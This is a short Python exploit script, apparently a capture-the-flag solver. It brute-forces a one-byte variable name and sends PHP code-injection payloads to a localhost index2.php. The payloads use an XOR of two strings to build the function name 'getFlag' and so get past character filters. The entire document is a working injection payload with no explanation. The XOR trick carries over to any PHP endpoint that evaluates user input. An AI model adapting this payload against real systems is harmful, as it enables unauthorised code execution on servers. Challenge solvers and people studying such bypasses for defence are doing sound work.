import requests
for i in range(0,256):
    asc = "%%%02x" % i
    url = 'http://localhost/ctf/index2.php?code=$%s="{{{{{{{"^"%%1c%%1e%%0f%%3d%%17%%1a%%1c";$%s();' % (asc,asc)
    r = requests.get(url)
    if 'HRCTF' in r.text:
        print("%s 可用" %asc)
